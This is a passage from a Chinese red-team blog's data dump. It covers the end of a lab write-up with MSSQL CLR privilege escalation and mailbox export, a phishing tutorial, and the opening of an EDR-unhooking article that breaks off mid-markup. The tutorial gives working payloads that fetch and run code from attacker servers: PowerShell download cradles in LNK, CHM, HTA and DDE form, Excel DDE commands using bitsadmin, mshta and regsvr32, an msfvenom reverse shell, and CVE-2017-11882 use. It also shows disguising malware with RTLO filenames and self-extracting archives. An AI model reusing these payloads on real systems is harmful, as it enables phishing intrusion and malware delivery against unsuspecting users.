class=\"line\">Mode                LastWriteTime         Length Name</span><br><span class=\"line\">----                -------------         ------ ----</span><br><span class=\"line\">-a----       2023&#x2F;12&#x2F;10     23:51         525312 Administrator.pst</span><br><span class=\"line\">-a----       2023&#x2F;12&#x2F;10     23:51         271360 DiscoverySearchMailbox &#123;D919BA05-46A6-415f-80AD-7E09334BB852&#125;.pst</span><br><span class=\"line\">-a----       2023&#x2F;12&#x2F;10     23:51         525312 exchange.pst</span><br><span class=\"line\">-a----       2023&#x2F;12&#x2F;10     23:51         271360 userd.pst</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\Administrator.PEN\\Desktop&gt; Compress-Archive -Path C:\\Users\\Public\\ -DestinationPath C:\\Users\\Public\\mail.zip</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\Administrator.PEN\\Desktop&gt; ls C:\\Users\\Public\\mail.zip</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    目录: C:\\Users\\Public</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Mode                LastWriteTime         Length Name</span><br><span class=\"line\">----                -------------         ------ ----</span><br><span class=\"line\">-a----       2023&#x2F;12&#x2F;10     23:56          80180 mail.zip</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"VLAN-4-172-26-8-0-24\"><a href=\"#VLAN-4-172-26-8-0-24\" class=\"headerlink\" title=\"VLAN 4 - 172.26.8.0/24\"></a>VLAN 4 - 172.26.8.0/24</h1><h2 id=\"MSSQL-172-26-8-16\"><a href=\"#MSSQL-172-26-8-16\" class=\"headerlink\" title=\"MSSQL 172.26.8.16\"></a>MSSQL 172.26.8.16</h2><p>通过 <code>PTH 172.24.7.43 - 172.26.8.12</code> 扫描发现存在一台MSSQL，懒得挂代理了，直接rdp上去用SharpSQL了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SharpSQLTools.exe 172.26.8.16:1433 sa sqlserver_2022 master install_clr</span><br><span class=\"line\">SharpSQLTools.exe 172.26.8.16:1433 sa sqlserver_2022 master enable_clr</span><br><span class=\"line\"></span><br><span class=\"line\">SharpSQLTools.exe 172.26.8.16:1433 sa sqlserver_2022 master clr_badpotato type C:\\Users\\Administrator\\Desktop\\flag.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250531163413850.png\" alt=\"image-20250531163413850\"></p>\n","categories":["云境靶场"]},{"title":"钓鱼","url":"/2024/11/07/%E9%92%93%E9%B1%BC/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>红蓝对抗之钓鱼，尝试几种钓鱼方式</p>\n<a id=\"more\"></a>\n\n<h1 id=\"钓鱼小技巧\"><a href=\"#钓鱼小技巧\" class=\"headerlink\" title=\"钓鱼小技巧\"></a>钓鱼小技巧</h1><h2 id=\"LNK快捷方式\"><a href=\"#LNK快捷方式\" class=\"headerlink\" title=\"LNK快捷方式\"></a>LNK快捷方式</h2><p>lnk文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。lnk钓鱼主要将图标伪装成正常图标，但是目标会执行shell命令。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603004753952.png\" alt=\"image-20220603004753952\"></p>\n<p>然后cs会生成powershell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;150.158.181.145:80&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure>\n\n<p>创建快捷方式</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603005235999.png\" alt=\"image-20220603005235999\"></p>\n<p>更改图标进行伪装</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">%SystemRoot%\\System32\\SHELL32.dll</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603005725670.png\" alt=\"image-20220603005725670\"></p>\n<h2 id=\"RTLO反转文件名\"><a href=\"#RTLO反转文件名\" class=\"headerlink\" title=\"RTLO反转文件名\"></a>RTLO反转文件名</h2><p>RTLO 字符全名为 “RIGHT-TO-LEFT OVERRIDE”，其本质是 unicode 字符。可以将任意语言的文字内容按倒序排列，最初是用来支持一些从右往左写的语言的文字，比如阿拉伯语，希伯来语。由于它可以重新排列字符的特性，会被攻击者利用从而达到欺骗目标</p>\n<p>将rtlo.exe(.scr等同于.exe)重命名为 rtlogpj.exe，然后再次重命名，在o和g中右键选择RLO即可</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603010907434.png\" alt=\"image-20220603010907434\"></p>\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603011032557.png\" alt=\"image-20220603011032557\"></p>\n<h2 id=\"HTA\"><a href=\"#HTA\" class=\"headerlink\" title=\"HTA\"></a>HTA</h2><p>HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，本身就是html应用程序，双击就能运行，却比普通网页权限大得多，它具有桌面程序的所有权限，与VB、C++等程序语言所设计的软件界面没什么差别。</p>\n<p>新建一个后缀为 .hta的HTA，输入以下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!--example1.hta--&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;test&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">p&#123;</span><br><span class=\"line\">font-size:24;</span><br><span class=\"line\">cursor:hand&#125;</span><br><span class=\"line\">&lt;&#x2F;style&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;center&gt;</span><br><span class=\"line\">&lt;p&gt;</span><br><span class=\"line\">HTA</span><br><span class=\"line\">HTMLApplication</span><br><span class=\"line\">test</span><br><span class=\"line\">&lt;&#x2F;p&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>运行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603011755241.png\" alt=\"image-20220603011755241\"></p>\n<p>CS可以直接生成</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603011823918.png\" alt=\"image-20220603011823918\"></p>\n<p>有三种方式的利用方式</p>\n<p>powershell：执行powershell语句</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">language</span>=<span class=\"string\">&quot;VBScript&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">\t<span class=\"built_in\">Function</span> var_func()</span></span><br><span class=\"line\">\t\tDim var_shell</span><br><span class=\"line\"><span class=\"javascript\">\t\t<span class=\"built_in\">Set</span> var_shell = CreateObject(<span class=\"string\">&quot;Wscript.Shell&quot;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">\t\tvar_shell.run <span class=\"string\">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQ......&quot;</span>, <span class=\"number\">0</span>, <span class=\"literal\">true</span></span></span><br><span class=\"line\"><span class=\"javascript\">\tEnd <span class=\"built_in\">Function</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\tvar_func</span><br><span class=\"line\">\tself.close</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>exe：将shellcode写入到exe中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603012135520.png\" alt=\"image-20220603012135520\"></p>\n<p>VBA：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603012324162.png\" alt=\"image-20220603012324162\"></p>\n<h2 id=\"CHM\"><a href=\"#CHM\" class=\"headerlink\" title=\"CHM\"></a>CHM</h2><p>CHM（Compiled Help Manual）即 “已编译的帮助文件”。它是微软新一代的帮助文件格式，利用 HTML 作源文，把帮助内容以类似数据库的形式编译储存。CHM 支持 Javascript、VBscript、ActiveX、Java Applet、Flash、常见图形文件(GIF、JPEG、PNG)、音频视频文件(MID、WAV、AVI)等等，并可以通过 URL 与 Internet 联系在一起。因为使用方便，形式多样也被采用作为电子书的格式。主要针对windows利用</p>\n<p>利用需要用到 <a href=\"http://www.etextwizard.com/\">EasyCHM</a></p>\n<p>新建html然后填入代码，CS上线，利用web delivery</p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class=\"line\">command exec </span><br><span class=\"line\">&lt;OBJECT id=x classid=<span class=\"string\">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> width=<span class=\"number\">1</span> height=<span class=\"number\">1</span>&gt;</span><br><span class=\"line\">&lt;PARAM name=<span class=\"string\">&quot;Command&quot;</span> value=<span class=\"string\">&quot;ShortCut&quot;</span>&gt;</span><br><span class=\"line\"> &lt;PARAM name=<span class=\"string\">&quot;Button&quot;</span> value=<span class=\"string\">&quot;Bitmap::shortcut&quot;</span>&gt;</span><br><span class=\"line\"> &lt;PARAM name=<span class=\"string\">&quot;Item1&quot;</span> value=<span class=\"string\">&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://ip:80/a&#x27;))&quot;</span>&gt;</span><br><span class=\"line\"> &lt;PARAM name=<span class=\"string\">&quot;Item2&quot;</span> value=<span class=\"string\">&quot;273,1,1&quot;</span>&gt;</span><br><span class=\"line\">&lt;/OBJECT&gt;</span><br><span class=\"line\">&lt;SCRIPT&gt;</span><br><span class=\"line\">x.Click();</span><br><span class=\"line\">&lt;/SCRIPT&gt;</span><br><span class=\"line\">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>导入项目</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603013308516.png\" alt=\"image-20220603013308516\"></p>\n<p>然后编译</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603014023391.png\" alt=\"image-20220603014023391\"></p>\n<p>先将一个正常的chm文档下载，利用hh命令转为html，然后将payload嵌入，再生成chm，<a href=\"https://blog.csdn.net/weixin_42131443/article/details/112719415\">红队攻防之CHM文档钓鱼</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hh -decompile .\\\\html CSS2.0中文手册.chm</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"自解压捆绑\"><a href=\"#自解压捆绑\" class=\"headerlink\" title=\"自解压捆绑\"></a>自解压捆绑</h2><p>将CS的马和正常软件，利用winrar进行压缩</p>\n<p>1.创建自解压格式压缩文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603022452804.png\" alt=\"image-20220603022452804\"></p>\n<p>2.高级-&gt;自解压选项</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603021013141.png\" alt=\"image-20220603021013141\"></p>\n<p>3.选项设置</p>\n<p>解压路径填temp目录</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603022529409.png\" alt=\"image-20220603022529409\"></p>\n<p>在 设置 中的解压后运行”输入要运行的程序</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603022618207.png\" alt=\"image-20220603022618207\"></p>\n<p>在 模式 中 安静模式 选择 全部隐藏 。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603021232524.png\" alt=\"image-20220603021232524\"></p>\n<p>在 更新 中的 更新方法 选择 解压并更新文件 ，覆盖方式 中选择 覆盖所有文件 。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603021130783.png\" alt=\"image-20220603021130783\"></p>\n<p>重命名为dingding.exe，可以再换个图标，然后和钉钉混淆再次压缩</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603021959459.png\" alt=\"image-20220603021959459\"></p>\n<p>然后解压</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603022805140.png\" alt=\"image-20220603022805140\"></p>\n<p>然后发送给鱼儿，鱼儿点击dingding.exe后就上线</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603023003573.png\" alt=\"image-20220603023003573\"></p>\n<h1 id=\"Office钓鱼\"><a href=\"#Office钓鱼\" class=\"headerlink\" title=\"Office钓鱼\"></a>Office钓鱼</h1><h2 id=\"word宏\"><a href=\"#word宏\" class=\"headerlink\" title=\"word宏\"></a>word宏</h2><p>CS生成</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603025630292.png\" alt=\"image-20220603025630292\"></p>\n<p>msf生成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -pwindows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.2.148 LPORT&#x3D;4444-fvba -ovba.txt</span><br></pre></td></tr></table></figure>\n\n<p>复制vba代码后，新建word，选择自定义功能区</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603030108163.png\" alt=\"image-20220603030108163\"></p>\n<p>点击开发工具 Visual Basic -&gt;ThisDocument。填入宏代码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603102631798.png\" alt=\"image-20220603102631798\"></p>\n<p>另存为.doc文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603103238408.png\" alt=\"image-20220603103238408\"></p>\n<p>默认为禁用宏，诱导用户点击启用内容</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603103328778.png\" alt=\"image-20220603103328778\"></p>\n<p>关于宏的免杀还需要下一步的学习</p>\n<h2 id=\"远程模板注入宏代码\"><a href=\"#远程模板注入宏代码\" class=\"headerlink\" title=\"远程模板注入宏代码\"></a>远程模板注入宏代码</h2><p>注入代码同上，另存为.dotm，上传到vps中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603104855200.png\" alt=\"image-20220603104855200\"></p>\n<p>现在需要一个通过网络来加载一个word模板的文件，最简单的方式就是通过word的联机模板，打开word，新建模板</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603113503210.png\" alt=\"image-20220603113503210\"></p>\n<p>保存后重命名为zip，修改 word\\_rels\\settings.xml.rels</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;</span><br><span class=\"line\">&lt;Relationships xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;package&#x2F;2006&#x2F;relationships&quot;&gt;&lt;Relationship Id&#x3D;&quot;rId1&quot; Type&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;officeDocument&#x2F;2006&#x2F;relationships&#x2F;attachedTemplate&quot; Target&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;C:\\Users\\AppData\\Local\\Microsoft\\Office\\16.0\\DTS\\zh-CN%7b5806EEF6-D82C-4B79-ABDC-924FDE8ECC47%7d\\%7bB273A1DB-3538-43EA-B625-4111FB66BA2A%7dtf16392715_win32.dotx&quot; TargetMode&#x3D;&quot;External&quot;&#x2F;&gt;&lt;&#x2F;Relationships&gt;</span><br></pre></td></tr></table></figure>\n\n<p>包含带有attachmentTemplate的Type的Relationship标记，是告诉Word打开该.docx时从哪里加载模板的设置，我们可以将Target值修改为远程位置。SMB也可以利用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603114248366.png\" alt=\"image-20220603114248366\"></p>\n<p>vps收到远程请求，点击启用宏即可上线</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603114443215.png\" alt=\"image-20220603114443215\"></p>\n<h2 id=\"CVE-2017-11882\"><a href=\"#CVE-2017-11882\" class=\"headerlink\" title=\"CVE-2017-11882\"></a>CVE-2017-11882</h2><p>此漏洞是由Office软件里面的公式编辑器造成的，即EQNEDT32.EXE程序，这个程序运行的过程中，读入包含MathType的ole数据时，在拷贝公式字体名称时没有对名称长度进行校验，从而造成栈缓冲区溢出，是一个非常经典的栈溢出漏洞，攻击者通过构造特殊的字符，可以实现任意代码执行。</p>\n<p>范围：Office 2003到2016的所有版本</p>\n<ul>\n<li>MicrosoftOffice 2000</li>\n<li>MicrosoftOffice 2003</li>\n<li>MicrosoftOffice 2007 Service Pack 3</li>\n<li>MicrosoftOffice 2010 Service Pack 2</li>\n<li>MicrosoftOffice 2013 Service Pack 1</li>\n<li>MicrosoftOffice 2016</li>\n</ul>\n<p>github-poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;CVE-2017-11882</span><br><span class=\"line\">python Command109b_CVE-2017-11882.py -c&quot;cmd.exe &#x2F;c calc.exe&quot;-otest.doc</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"word插入外部对象-OLE\"><a href=\"#word插入外部对象-OLE\" class=\"headerlink\" title=\"word插入外部对象(OLE)\"></a>word插入外部对象(OLE)</h2><p>插入对象，可以准备个word的ico，替换图标</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603131913622.png\" alt=\"image-20220603131913622\"></p>\n<p>双击运行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603132328164.png\" alt=\"image-20220603132328164\"></p>\n<h2 id=\"DDE\"><a href=\"#DDE\" class=\"headerlink\" title=\"DDE\"></a>DDE</h2><p><a href=\"https://cloud.tencent.com/developer/article/1816083\">鱼叉钓鱼：利用 Office 文档进行 DDE 攻击 - 云+社区 - 腾讯云 (tencent.com)</a></p>\n<p>动态数据交换(DDE) 是一个自定义字段，用户可插入文档。这些字段允许用户输入简单的说明，包括插入到新文档中的数据及插入位置。攻击者可以创建包含DDE字段的恶意Word文件（而不需要打开另一个Office应用程序）、打开命令提示符和运行恶意代码。</p>\n<p>首先通过 word 文档设置一个域代码：<strong>crlt+f9</strong>，或者选中<strong>插入 - 文件部件 - 域</strong>，选中第一个 <strong>= (Formula)</strong> 然后<strong>右键切换域代码</strong>来编辑代码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603133327289.png\" alt=\"image-20220603133327289\"></p>\n<p>CS 生成远程生成powershell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">DDEAUTO&quot;C:\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.2.148:8000&#x2F;beacon.ps1&#39;); # &quot;&quot;Microsoft Document Security Add-On&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603143407697.png\" alt=\"image-20220603143407697\"></p>\n<p>需要点击两次是</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603134518207.png\" alt=\"image-20220603134518207\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603135852937.png\" alt=\"image-20220603135852937\"></p>\n<h2 id=\"IYQ\"><a href=\"#IYQ\" class=\"headerlink\" title=\"IYQ\"></a>IYQ</h2><p>可以将IYQ简单的理解成内置在excel中的一种特殊 web浏览器 （不能加载脚本），通过IQY【即web查询】语句，可以直接将各类web上的列表数据轻松引入到当前的excel中，而正是因为这样，从而给了我们利用excel制作钓鱼邮件的机会，假如你要引入的web数据是入侵者事先准备好的一段payload iqy恶意代码，那结果就不言而喻了。</p>\n<p>office 2016：数据-&gt; 来自网站</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603160846572.png\" alt=\"image-20220603160846572\"></p>\n<p>其他方式</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">regsv***</span><br><span class=\"line\">&#x3D;cmd|&#39;&#x2F;c regsv*** &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;ip&#x2F;D4zv0M.sct scrobj.dll &#39;!A0</span><br><span class=\"line\">bitsadmin</span><br><span class=\"line\">&#x3D;cmd|&#39;&#x2F;c bitsadmin &#x2F;transfer e822 http:&#x2F;&#x2F;ip&#x2F;iqy %APPDATA%\\e822.exe&amp;%APPDATA%\\e822.exe&amp;del %APPDATA%\\e822.exe &#39;!A0</span><br><span class=\"line\">mshta</span><br><span class=\"line\">&#x3D;cmd|&#39;&#x2F;c mshta http:&#x2F;&#x2F;ip&#x2F;iqy.hta &#39;!A0</span><br></pre></td></tr></table></figure>\n\n<p>上线，利用工具 nishang：<a href=\"https://github.com/samratashok/nishang/releases\">https://github.com/samratashok/nishang/releases</a></p>\n<p>具体利用过程：<a href=\"https://www.cnblogs.com/askta0/p/10893535.html#/c/subject/p/10893535.html\">Excel的IYQ钓鱼 - AskTa0 - 博客园 (cnblogs.com)</a></p>\n<h2 id=\"PPT动作\"><a href=\"#PPT动作\" class=\"headerlink\" title=\"PPT动作\"></a>PPT动作</h2><p>插入最后一个空白动作按钮</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603161747121.png\" alt=\"image-20220603161747121\"></p>\n<p>设置触发动作为运行程序，这里利用hta上线</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">c:\\Windows\\System32\\mshta.exe http:&#x2F;&#x2F;150.158.181.145:8000&#x2F;evil.hta</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603162346990.png\" alt=\"image-20220603162346990\"></p>\n<p>右键设置形状格式，变为透明隐藏格式</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603162916046.png\" alt=\"image-20220603162916046\"></p>\n<p>触发时会弹窗提示，点击启用上线</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fish/image-20220603162957632.png\" alt=\"image-20220603162957632\"></p>\n<h1 id=\"邮箱\"><a href=\"#邮箱\" class=\"headerlink\" title=\"邮箱\"></a>邮箱</h1><p><a href=\"https://www.freebuf.com/articles/network/250134.html\">红队测试之邮箱打点 - FreeBuf网络安全行业门户</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://mp.weixin.qq.com/s/YKZ6yWWxOhn2KjTV5lDP7w\">红蓝对抗之邮件钓鱼攻击 (qq.com)</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1917641\">干货 | Office文档钓鱼的实战和免杀技巧 - 云+社区 - 腾讯云 (tencent.com)</a></p>\n","categories":["Red-Team"]},{"title":"Api Unhook","url":"/2026/02/14/unhookdll/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/flying.jpg\" alt=\"flying\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h1><h2 id=\"protection-rings\"><a href=\"#protection-rings\" class=\"headerlink\" title=\"protection rings\"></a>protection rings</h2><p>保护环，是计算机体系结构中用来描述不同权限级别的一种机制。它们的设计目的是为了实现对系统资源的访问控制，确保程序和用户在执行时的安全性和隔离性。</p>\n<p>内核模式（Ring 0、0环）是操作系统的核心部分，具有对所有硬件资源和内存的完全控制权限。</p>\n<p>用户模式（Ring 3、3环）是用户程序、应用程序和其他非核心服务运行的地方。</p>\n<h2 id=\"Ring3-to-Ring0\"><a href=\"#Ring3-to-Ring0\" class=\"headerlink\" title=\"Ring3 to Ring0\"></a>Ring3 to Ring0</h2><p>在用户模式下调用API时往往最后都是通过syscall调用，在内核模式中进行真正的处理，具体过程不进行展开，可以搜索Windows API函数分析、Ring3到Ring0等文章。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260131181542056.png\" alt=\"image-20260131181542056\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260131175756468.png\" alt=\"image-20260131175756468\"></p>\n<h2 id=\"SSDT\"><a href=\"#SSDT\" class=\"headerlink\" title=\"SSDT\"></a>SSDT</h2><p>系统服务描述符表（System Service Descriptor Table，简称SSDT）是一个在内核空间的函数索引表，通过接受syscall传入的 系统服务号（System Service ID，System Service Number, System Call Number，简称SSN）来返回对应的函数地址。类似如下结构</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Function\t\t\tSSN\t\tKernel address</span><br><span class=\"line\">NtCreateFile\t\t55\t\t0x5ea54623</span><br><span class=\"line\">NtCreateIRTimer\t\tab\t\t0x6bcd1576</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260131224802140.png\" alt=\"image-20260131224802140\"></p>\n<h2 id=\"Hook\"><a href=\"#Hook\" class=\"headerlink\" title=\"Hook\"></a>Hook</h2><p>关于hook技术的实现，不是本文重点。总体上分为两类：</p>\n<ul>\n<li>修改函数代码：Inline hook</li>\n<li>修改函数地址：IAT hook、SSDT hook、IRP hook、IDT hook等</li>\n</ul>\n<p>程序在运行时一定会调用某些系统调用，EDR为了检测这些调用行为是正常的还是恶意的，会去主动hook与调用相关的函数或表，如Windows API、SSDT等，在调用触发hook时，EDR/AV会执行自定义的检测逻辑。hook可以选择在用户态或者内核态进行，在遥远的x86的XP时代中，选择了最直接的内核态hook，通过修改 SSDT 内核函数的地址将调用重定向到他们自己的驱动程序，从而实现检测。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260131231627638.png\" alt=\"image-20260131231627638\"></p>\n<p> 如果内核轻松可以进行修改，将导致内核稳定性的缺失，因此微软为了保护其操作系统，于2005年的X64版本系统中推出了 <strong>内核补丁保护（Kernel Patch Protection，KPP，简称 PatchGuard）</strong>，PatchGuard 是一种主动安全机制，它会定期检查多个关键 Windows 内核结构的状态，如果其中一个结构被除合法内核代码之外的任何内容修改，PatchGuard 就会发出致命的系统错误从而蓝屏重启。被禁止的修改包括：</p>\n<ul>\n<li>Modifying system service descriptor tables（SSDT）</li>\n<li>Modifying the interrupt descriptor table</li>\n<li>Modifying the global descriptor table</li>\n<li>Using kernel stacks not allocated by the kernel</li>\n<li>Modifying or patching code contained within the kernel itself, or the HAL or NDIS kernel libraries</li>\n</ul>\n<p>可以看到现代EDR由于 PatchGuard 的引进，直接使SSDT hook失效，不过微软为了解决这个问题并使安全产品能够再次监控系统，引入了新的机制 <strong>回调对象</strong>，本文不再展开。同时hook技术也转向了用户态，通过对常见的dll，例如ntdll.dll、kernel32.dll、user32.dll等进行hook，常见使用Inline hook修改函数代码，插入jmp指令，跳转到自定义的检测逻辑。至此EDR有了回调对象机制和用户态hook两把利剑。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260131235242771.png\" alt=\"image-20260131235242771\"></p>\n<h1 id=\"Hook检测\"><a href=\"#Hook检测\" class=\"headerlink\" title=\"Hook检测\"></a>Hook检测</h1><p>通过调试，在程序启动过程中会被AV/EDR注入dll</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201131125111.png\" alt=\"image-20260201131125111\"></p>\n<p>添加了白名单后的干净程序是这样的，只加载必须的系统dll</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201133529407.png\" alt=\"image-20260201133529407\"></p>\n<p>查看导出函数会发现很多关于hook的函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201132845746.png\" 